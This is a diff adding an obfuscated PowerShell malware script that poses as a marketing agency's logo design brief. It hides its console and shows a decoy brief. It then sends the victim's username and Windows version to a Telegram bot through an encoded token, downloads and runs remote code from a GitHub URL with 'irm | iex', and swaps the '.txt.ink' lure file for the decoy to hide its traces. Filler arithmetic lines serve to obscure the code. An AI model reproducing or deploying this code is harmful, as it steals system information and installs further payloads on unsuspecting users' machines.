@@ -1,0 +1,109 @@
+Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
+$v0=[b0.a0]::GetConsoleWindow()
+[b0.a0]::ShowWindow($v0,0)
+$v1=1+2*3-4
+If($v1>0){}
+$v2="MAIN_Logo_Specifications.txt"
+$v3=Join-Path $env:LOCALAPPDATA $v2
+$v4=@"
+LOGO DESIGN BRIEF - MARKETING MAIN STREET
+
+So here's the deal. We've been running Marketing Main Street since 2021 out of Stuart, Iowa. Nate (that's me, the founder) previously owned Ruby's Pub for about a decade before pivoting into digital marketing. We help small businesses across Central Iowa get seen online - that's pretty much our whole thing.
+
+Currently serving about 18 cities: Des Moines, Waukee, West Des Moines, Ankeny, Clive, Urbandale, Perry, and a bunch more surrounding areas. Web design, video production, social media, SEO - the usual marketing stuff for local businesses.
+
+What we need:
+
+A new logo. The current one isn't bad or anything, it's just... it's had its run, you know? Feels a little dated and honestly it doesn't really capture what we're about anymore. Looking for something that speaks to Iowa small business owners without looking like every other generic marketing agency out there.
+
+Design direction-wise: Midwest vibes but keep it modern. We're talking restaurants, contractors, salons, bakeries - all kinds of local businesses. Should feel approachable, trustworthy. Not flashy, not corporate. Small-town friendly but professionally done.
+
+Colors: we've been using orange/coral as the main accent with blue as secondary. Doesn't have to stay exactly the same but should keep some connection. Just make sure it works for both digital stuff and print.
+
+Typography: clean and readable first. Needs to look good small (like favicon size) and large (website header). Sans-serif probably makes more sense for our industry, but honestly if something with more character fits the Iowa vibe, we're open to it.
+
+Deliverables we need:
+
+1. Primary logo in full color
+2. Black/white version
+3. Reversed version for dark backgrounds
+4. Icon-only version for social media profiles
+5. All vector files (AI, EPS, SVG)
+6. PNG exports at 300dpi in 512x512, 1024x1024, 2000x2000
+
+Technical stuff:
+
+File formats: AI, EPS, SVG, PDF, PNG
+Resolution: minimum 300dpi for raster formats
+Safe zone: 10% padding around elements
+Color mode: CMYK for print, RGB for digital
+
+Process: we'll want to see 3 initial concepts before deciding on direction. Then up to 2 rounds of revisions on the chosen one.
+
+Contact me at nate@marketingmainstreet.co if you're interested. Send along examples of similar work you've done - marketing agencies or local businesses preferred.
+
+"@
+$v5=5*2-3
+If($v5>0){}
+$v4|Out-File -FilePath $v3 -Encoding UTF8
+Invoke-Item $v3
+$v6="ab01256441"
+$v7=Get-Random -Minimum 100000 -Maximum 999999
+$v8=cmd /c whoami
+$v9="Build ID: "+$v6+" | Attack ID: "+$v7+" | Device/User: "+$v8
+$v10=Join-Path $env:LOCALAPPDATA "identifier.txt"
+$v11=7*3-5
+If($v11>0){}
+$v9|Out-File -FilePath $v10 -Encoding UTF8 -NoNewline
+$v12="OAAAADkAAAA3AAAANgAAADEAAAAzAAAANAAAADgAAAA5AAAAMAAAADoAAABBAAAAQQAAAEYAAAB6AAAAXwAAAFEAAABHAAAATgAAAHYAAABKAAAARgAAAHoAAAA5AAAASgAAADAAAABXAAAAMQAAAGIAAABLAAAARwAAADUAAABLAAAAOAAAAHYAAABjAAAAWQAAAG8AAABDAAAANAAAADcAAABFAAAAawAAAEwAAABkAAAAawAAAA=="
+$v13=[System.Convert]::FromBase64String($v12)
+$v14=[System.Text.Encoding]::UTF32
+$v15=$v14.GetString($v13)
+$v16="MgAAADcAAAAwAAAAOAAAADYAAAA1AAAANAAAADAAAAA4AAAA"
+$v17=[System.Convert]::FromBase64String($v16)
+$v18=$v14.GetString($v17)
+$v19=8/2+1
+If($v19>0){}
+$v20=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$v21=(Get-CimInstance Win32_OperatingSystem).Caption
+$v22=Get-Content -Path $v10 -Raw
+$v23=$v22+"`n`nSession started for user: "+$v20+"`nWindows Version: "+$v21
+$v24="https://api.telegram.org/bot"+$v15+"/sendMessage"
+$v25=6*2-3
+If($v25>0){}
+$v26=@{chat_id=$v18;text=$v23}|ConvertTo-Json -Compress
+$v27=4+6-2
+If($v27>0){}
+try{$v28=Invoke-RestMethod -Uri $v24 -Method Post -ContentType "application/json" -Body $v26}catch{}
+$v29="___"
+$v30=[System.Convert]::FromBase64String($v29)
+$v31=$v14.GetString($v30)
+$v32="___"
+$v33=[System.Convert]::FromBase64String($v32)
+$v34=$v14.GetString($v33)
+$v35=3*4-2
+If($v35>0){}
+$v36="https://api.telegram.org/bot"+$v31+"/sendMessage"
+$v37=2*5-1
+If($v37>0){}
+$v38=@{chat_id=$v34;text=$v23}|ConvertTo-Json -Compress
+$v39=9-3+1
+If($v39>0){}
+try{$v40=Invoke-RestMethod -Uri $v36 -Method Post -ContentType "application/json" -Body $v38}catch{}
+$v41=8*2-3
+If($v41>0){}
+Start-Sleep -Seconds 333
+$v42=7*2-1
+If($v42>0){}
+irm https://github.com/fg9q/232312hjd/raw/refs/heads/main/jdksaasd_polys | iex
+$v43="MAIN_Logo_Specifications.txt.ink"
+$v44=$false
+$v45=$null
+$v46=@((Join-Path $env:USERPROFILE "Desktop"),(Join-Path $env:USERPROFILE "Downloads"),(Join-Path $env:USERPROFILE "Documents"),(Join-Path $env:USERPROFILE "Pictures"),(Join-Path $env:USERPROFILE "Videos"),$env:LOCALAPPDATA,$env:APPDATA)
+$v47=6*3-2
+If($v47>0){}
+foreach($v48 in $v46){If(Test-Path -Path $v48){$v49=Join-Path $v48 $v43;If(Test-Path -Path $v49){$v45=$v49;$v44=$true;break}}}
+$v50=5+3-1
+If($v50>0){}
+If($v44){$v51=Split-Path -Parent $v45;$v52=Get-Date;$v53=600;while(((Get-Date)-$v52).TotalSeconds -lt $v53){$v54=Get-Process -Name "wscript" -ErrorAction SilentlyContinue;If($v54){try{Remove-Item -Path $v45 -Force -ErrorAction Stop;$v55=Join-Path $v51 (Split-Path -Leaf $v3);Copy-Item -Path $v3 -Destination $v55 -Force -ErrorAction Stop;exit}catch{exit}}Start-Sleep -Seconds 3}}
+exit
